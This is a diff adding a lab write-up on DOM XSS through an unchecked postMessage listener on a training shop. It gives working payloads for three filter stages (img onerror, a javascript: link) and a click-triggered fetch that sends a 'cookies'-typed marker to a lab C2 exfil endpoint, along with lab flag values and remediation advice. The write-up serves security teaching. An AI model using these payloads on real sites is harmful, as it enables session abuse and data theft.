@@ -2053,3 +2053,403 @@ The Stage 3 exploit successfully sent a synthetic marker to the lab C2 dashboard
 **Final flag:** `FLAG{f10480356860a010a1f2c403cf62ee41}`
 
 **Core lesson:** Client-controlled URL fragments are untrusted input. They must not be passed into HTML-parsing sinks, and filtering individual dangerous strings cannot replace context-appropriate DOM APIs and robust URL validation.
+
+
+
+
+## Task 6: DOM XSS - postMessage Abuse
+
+### Vulnerability Description
+
+A DOM-based Cross-Site Scripting (XSS) vulnerability was identified in the NexusShop shopping-cart **Special Offers** widget. The cart page listens for browser `message` events and inserts message-controlled content into the DOM using `innerHTML`. In Stages 1 and 2, an attacker-controlled `content` value can create an HTML element with an executable event handler. In Stage 3, the listener requires a particular message object but still allows a `javascript:` link to reach the same HTML sink, enabling JavaScript execution after a user click.
+
+The handlers do not check `event.origin` or `event.source`, so they do not distinguish trusted message senders from other origins or windows. The lab proved injection using messages sent from the same page's Console. A separate cross-origin sender was **not** tested, but the missing origin check creates a cross-origin message injection risk when another page can obtain a reference to the receiving window. The filters used in Stages 2 and 3 are insufficient because removing `<script>` tags or rewriting common event-handler attributes does not make arbitrary HTML safe.
+
+### Location & Parameters
+
+| Attribute | Details |
+|-----------|---------|
+| **Application** | NexusShop |
+| **Base URL** | `http://web0x0c.hbtn` |
+| **Stage 1 URL** | `/cart` |
+| **Stage 2 URL** | `/cart/checkout` |
+| **Stage 3 URL** | `/cart/payment` |
+| **Input source** | `MessageEvent.data`, received by `window.addEventListener('message', ...)` |
+| **Parameter/Field** | `content`; also raw string messages in Stages 1 and 2 |
+| **Stage 3 required field** | `type: 'widget-update'` |
+| **DOM sink** | `document.getElementById('widget-message').innerHTML` |
+| **Type** | DOM-based XSS via `postMessage` |
+| **Severity** | **High** (demonstrated JavaScript execution; cross-origin delivery not separately tested) |
+| **Challenge context** | Level 8, Stage 3 (confirmed by C2 record) |
+| **C2 endpoint** | `/attacker/api/exfil` |
+| **Tracking endpoint** | `/cart/api/track` |
+| **Flag file** | `web_application_security/websec_0x0C/7-flag.txt` |
+
+### Attack Vector
+
+#### 1. Identify the message source and DOM sink (Stage 1)
+
+Open `http://web0x0c.hbtn/cart` and send a harmless object from Firefox DevTools Console:
+
+```javascript
+window.postMessage({ content: 'TASK6_STAGE1_TEST' }, '*');
+```
+
+The **Special Offers** area updates, and Inspector shows:
+
+```html
+<div id="widget-message" class="mt-3 text-sm text-zinc-500">TASK6_STAGE1_TEST</div>
+```
+
+The Stage 1 listener is:
+
+```javascript
+// VULNERABLE: postMessage handler without origin check
+window.addEventListener('message', function(event) {
+    // Stage 1: No filter - direct innerHTML
+    if (typeof event.data === 'string') {
+        document.getElementById('widget-message').innerHTML = event.data;
+    } else if (event.data.content) {
+        document.getElementById('widget-message').innerHTML = event.data.content;
+    }
+});
+```
+
+**Source-to-sink chain:** `postMessage` → `event.data.content` → `innerHTML`.
+
+#### 2. Confirm HTML injection and JavaScript execution (Stage 1)
+
+A harmless HTML probe was sent using the exact same-origin target:
+
+```javascript
+window.postMessage(
+    { content: '<b id="postmessage-stage1-probe">STAGE1_HTML_OK</b>' },
+    window.location.origin
+);
+```
+
+Inspector confirmed a real `<b>` element under `widget-message`, rather than escaped text:
+
+```html
+<div id="widget-message" class="mt-3 text-sm text-zinc-500">
+    <b id="postmessage-stage1-probe">STAGE1_HTML_OK</b>
+</div>
+```
+
+Next, the following proof-of-execution message was sent:
+
+```javascript
+window.postMessage({
+    content: `<img src="x" onerror="console.log('POSTMESSAGE_STAGE1_XSS_EXECUTED')">`
+}, window.location.origin);
+```
+
+The Console displayed:
+
+```text
+POSTMESSAGE_STAGE1_XSS_EXECUTED
+```
+
+**Result:** Stage 1 DOM XSS confirmed. The failing image automatically fires the injected `onerror` handler.
+
+#### 3. Identify and bypass the script-tag filter (Stage 2)
+
+Open `http://web0x0c.hbtn/cart/checkout`. The Stage 2 handler is:
+
+```javascript
+// VULNERABLE: postMessage handler without origin check
+window.addEventListener('message', function(event) {
+    // Stage 2: Basic filter
+    if (typeof event.data === 'string') {
+        let msg = event.data.replace(/<script[^>]*>.*?<\/script>/gi, '');
+        document.getElementById('widget-message').innerHTML = msg;
+    } else if (event.data.content) {
+        let msg = event.data.content.replace(/<script[^>]*>.*?<\/script>/gi, '');
+        document.getElementById('widget-message').innerHTML = msg;
+    }
+});
+```
+
+The filter attempts to remove `<script>...</script>` elements but does not sanitize event-handler attributes. The tested message was:
+
+```javascript
+window.postMessage({
+    content: `<script>console.log('STAGE2_SCRIPT')</script>
+<img src=x onerror="console.log('POSTMESSAGE_STAGE2_XSS_EXECUTED')">`
+}, window.location.origin);
+```
+
+The Console displayed:
+
+```text
+POSTMESSAGE_STAGE2_XSS_EXECUTED
+```
+
+Inspector showed that the script element had been removed while the image's executable handler survived:
+
+```html
+<div id="widget-message" class="mt-3 text-sm text-zinc-500">
+    <img src="x" onerror="console.log('POSTMESSAGE_STAGE2_XSS_EXECUTED')">
+</div>
+```
+
+**Result:** Stage 2 DOM XSS confirmed. Blocking `<script>` tags alone does not prevent execution via an HTML event handler. Note that scripts inserted using `innerHTML` are generally inert even without this filter; the decisive proof is the `onerror` execution.
+
+#### 4. Analyze the strict object requirements and filters (Stage 3)
+
+Open `http://web0x0c.hbtn/cart/payment`. The Stage 3 handler is:
+
+```javascript
+// VULNERABLE: postMessage handler without origin check
+window.addEventListener('message', function(event) {
+    // Stage 3: Strict filter
+    if (typeof event.data !== 'object') return;
+    if (event.data.type !== 'widget-update') return;
+    let msg = event.data.content || '';
+    msg = msg.replace(/<script[^>]*>.*?<\/script>/gi, '')
+             .replace(/on\w+\s*=/gi, 'data-blocked=');
+    document.getElementById('widget-message').innerHTML = msg;
+});
+```
+
+Stage 3 requires an object containing `type: 'widget-update'` and reads its `content` property. It does **not** read an alternate `html` property. No `event.origin` validation is performed.
+
+A harmless HTML probe confirmed that the required message shape is accepted:
+
+```javascript
+window.postMessage({
+    type: 'widget-update',
+    content: '<b id="stage3-widget-probe">STAGE3_HTML_OK</b>'
+}, window.location.origin);
+```
+
+The displayed text was bold, and Inspector showed:
+
+```html
+<div id="widget-message" class="mt-3 text-sm text-zinc-500">
+    <b id="stage3-widget-probe">STAGE3_HTML_OK</b>
+</div>
+```
+
+The object-shape check is therefore not a defense against malicious HTML once the expected properties are supplied.
+
+#### 5. Bypass Stage 3 filtering with a `javascript:` link
+
+The Stage 3 regex removes certain script elements and rewrites attributes matching `on\w+\s*=`, but neither operation checks the `href` URL scheme. The following message was sent:
+
+```javascript
+window.postMessage({
+    type: 'widget-update',
+    content: `<a href="javascript:console.log('POSTMESSAGE_STAGE3_XSS_EXECUTED')">CLICK_STAGE3_TEST</a>`
+}, window.location.origin);
+```
+
+Inspector confirmed that the injected link retained its executable URL:
+
+```html
+<div id="widget-message" class="mt-3 text-sm text-zinc-500">
+    <a href="javascript:console.log('POSTMESSAGE_STAGE3_XSS_EXECUTED')">
+        CLICK_STAGE3_TEST
+    </a>
+</div>
+```
+
+Clicking **CLICK_STAGE3_TEST** produced:
+
+```text
+POSTMESSAGE_STAGE3_XSS_EXECUTED
+```
+
+**Result:** Stage 3 DOM XSS confirmed. Unlike the automatic `onerror` exploits in Stages 1 and 2, this particular bypass requires the user to click the injected link.
+
+#### 6. Verify C2 communication from the injected Stage 3 link
+
+The following message added a clickable link that POSTed a **synthetic proof marker** to the lab's C2 endpoint:
+
+```javascript
+window.postMessage({
+    type: 'widget-update',
+    content: `<a href="javascript:fetch('/attacker/api/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cookies',data:'POSTMESSAGE_STAGE3_C2_PROOF',level:8,stage:3})}).then(r=>console.log('C2_STATUS:',r.status))">SEND_STAGE3_C2_TEST</a>`
+}, window.location.origin);
+```
+
+After clicking **SEND_STAGE3_C2_TEST**, the Console showed:
+
+```text
+C2_STATUS: 200
+```
+
+The C2 dashboard at `/attacker` displayed a corresponding Level 8 / Stage 3 record containing:
+
+```text
+POSTMESSAGE_STAGE3_C2_PROOF
+```
+
+The record was categorized as **COOKIES** because the test used `type: 'cookies'`, but its contents were a synthetic marker. **No actual cookie or credential theft was demonstrated.**
+
+#### 7. Capture the Stage 3 flag through the actual XSS path
+
+The following Stage 3 message created a link that reads the page's hidden `tracking-id` value and submits it to `/cart/api/track` when clicked:
+
+```javascript
+window.postMessage({
+    type: 'widget-update',
+    content: `<a href="javascript:fetch('/cart/api/track?t='+encodeURIComponent(document.getElementById('tracking-id').textContent.trim())).then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>`
+}, window.location.origin);
+```
+
+Clicking **CAPTURE_STAGE3_FLAG** produced:
+
+```json
+{"ref":"FLAG{2621d9b68d485bb1d0d9ad2726ecf39d}","status":"tracked"}
+```
+
+**Result:** The Stage 3 flag was returned through the **message injection → `innerHTML` → clickable `javascript:` URL** exploitation path, not by manually calling the tracking endpoint from the Console.
+
+### Payload Used
+
+**Stage 1, automatic execution**
+
+```javascript
+window.postMessage({
+    content: `<img src="x" onerror="console.log('POSTMESSAGE_STAGE1_XSS_EXECUTED')">`
+}, window.location.origin);
+```
+
+**Stage 2, script-tag filter bypass**
+
+```javascript
+window.postMessage({
+    content: `<script>console.log('STAGE2_SCRIPT')</script>
+<img src=x onerror="console.log('POSTMESSAGE_STAGE2_XSS_EXECUTED')">`
+}, window.location.origin);
+```
+
+**Stage 3, click-triggered JavaScript execution**
+
+```javascript
+window.postMessage({
+    type: 'widget-update',
+    content: `<a href="javascript:console.log('POSTMESSAGE_STAGE3_XSS_EXECUTED')">CLICK_STAGE3_TEST</a>`
+}, window.location.origin);
+```
+
+**Stage 3, final flag-capture payload**
+
+```javascript
+window.postMessage({
+    type: 'widget-update',
+    content: `<a href="javascript:fetch('/cart/api/track?t='+encodeURIComponent(document.getElementById('tracking-id').textContent.trim())).then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>`
+}, window.location.origin);
+```
+
+### Evidence
+
+| Check | Observed result |
+|-------|-----------------|
+| Stage 1 `content` field is rendered as HTML | Actual `<b>` element appeared in `widget-message` |
+| Stage 1 JavaScript execution | `POSTMESSAGE_STAGE1_XSS_EXECUTED` in Console |
+| Stage 2 script removal | `<script>` absent from resulting DOM |
+| Stage 2 JavaScript execution | `POSTMESSAGE_STAGE2_XSS_EXECUTED` in Console; `<img onerror>` preserved |
+| Stage 3 required object shape | `{ type: 'widget-update', content: ... }` accepted |
+| Stage 3 JavaScript URL survives filters | `<a href="javascript:...">` appeared in Inspector |
+| Stage 3 JavaScript execution | `POSTMESSAGE_STAGE3_XSS_EXECUTED` after clicking |
+| C2 request | `C2_STATUS: 200` |
+| C2 dashboard | Level 8 / Stage 3, `POSTMESSAGE_STAGE3_C2_PROOF` |
+| Tracking endpoint | `/cart/api/track` |
+| Tracking response | `"status":"tracked"` and flag reference |
+
+**Flag:**
+
+```text
+FLAG{2621d9b68d485bb1d0d9ad2726ecf39d}
+```
+
+**Confirmed submission file:**
+
+```text
+web_application_security/websec_0x0C/7-flag.txt
+```
+
+**File contents:**
+
+```text
+2621d9b68d485bb1d0d9ad2726ecf39d
+```
+
+The lab's verification checklist is supported by demonstrated handler analysis, JavaScript execution, C2 communication, and Stage 3 flag retrieval. One qualification remains: the tests sent messages from the page's own Console; a distinct cross-origin sending page was not tested.
+
+### Real-World Impact
+
+A page that accepts untrusted `postMessage` data and writes it to `innerHTML` can become a cross-window or cross-origin injection target. If an attacker-controlled page obtains a reference to the vulnerable window, it may be able to send a crafted message that the receiver treats as trusted. The precise delivery conditions depend on how the application opens, embeds, or interacts with other windows and frames.
+
+Possible consequences include:
+
+1. **Session-context abuse:** Running JavaScript in the cart page's origin and making requests using its active browser session.
+2. **Sensitive-data exposure:** Reading application data accessible to JavaScript and sending it to a remote endpoint, subject to browser security controls.
+3. **Unauthorized transactions or changes:** Triggering application requests in the victim's session if suitable endpoints exist and other protections do not block them.
+4. **Phishing or UI manipulation:** Replacing the Special Offers widget with deceptive links, messages, or forms.
+5. **Cross-origin attack delivery:** Exploiting missing `event.origin` checks when the receiver can be messaged by an untrusted window.
+6. **User-assisted code execution:** In Stage 3, presenting a clickable `javascript:` URL that executes after user interaction.
+
+The lab directly demonstrated JavaScript execution and transmission of a synthetic marker to its C2 endpoint. It did not demonstrate theft of real credentials, session cookies, or payment information.
+
+### Remediation
+
+**1. Verify the sender origin and, when appropriate, the sender window.** Only accept messages from an explicit allowlist of trusted origins. Do not rely on `targetOrigin` supplied by a sender to protect the receiver.
+
+```javascript
+const TRUSTED_ORIGIN = 'https://trusted-widget.example';
+const trustedFrame = document.getElementById('trusted-widget-frame');
+
+window.addEventListener('message', event => {
+    if (event.origin !== TRUSTED_ORIGIN) return;
+    if (event.source !== trustedFrame?.contentWindow) return;
+    // Validate data before use.
+});
+```
+
+The origin above is illustrative; replace it with the actual trusted widget origin.
+
+**2. Validate the complete message schema.** Accept only plain objects with the correct `type` and a string `content` field; reject arrays, `null`, unexpected shapes, or invalid lengths. In JavaScript, `typeof null === 'object'`, so the Stage 3 check alone does not safely establish a valid object.
+
+```javascript
+function validWidgetMessage(data) {
+    return data !== null &&
+        typeof data === 'object' &&
+        !Array.isArray(data) &&
+        data.type === 'widget-update' &&
+        typeof data.content === 'string' &&
+        data.content.length <= 1000;
+}
+```
+
+**3. Use `textContent` for plain-text offers.** The safest fix is to avoid HTML parsing entirely when no rich formatting is required.
+
+```javascript
+document.getElementById('widget-message').textContent = event.data.content;
+```
+
+**4. If HTML is required, sanitize with a maintained allowlist-based parser.** Restrict allowed elements, attributes, and URL schemes. For example, permit HTTPS links while rejecting `javascript:` URLs, event-handler attributes, and unsafe embedded content. Do not use regex-only HTML filtering.
+
+**5. Add a restrictive Content Security Policy.** A policy that disallows inline JavaScript and event handlers can limit exploitation of `javascript:` URLs. CSP is defense in depth, not a replacement for origin checks or safe rendering.
+
+**6. Test both message trust and DOM rendering.** Automated browser tests should cover untrusted origins, wrong object types, missing fields, `null`, alternate fields such as `html`, raw HTML, event-handler attributes, `javascript:` links, and both automatic and click-triggered execution paths.
+
+### Conclusion
+
+Task 6 demonstrated three progressively constrained variations of DOM XSS through an unsafe `postMessage` event listener:
+
+| Stage | Defense | Verified bypass |
+|-------|---------|-----------------|
+| **1: `/cart`** | No content filter | `<img onerror>` executes automatically |
+| **2: `/cart/checkout`** | Removes `<script>` tags | `<img onerror>` remains executable |
+| **3: `/cart/payment`** | Requires `widget-update`; filters script tags and common event handlers | `javascript:` link executes after a click |
+
+The Stage 3 exploit successfully produced C2 evidence and obtained the flag through the injected widget link:
+
+```text
+FLAG{2621d9b68d485bb1d0d9ad2726ecf39d}
+```
+
+**Central lesson:** A `postMessage` handler must authenticate the sender, validate the message schema, and render untrusted data safely. Checking message shape or removing selected HTML patterns is insufficient while unsanitized content still reaches `innerHTML`.
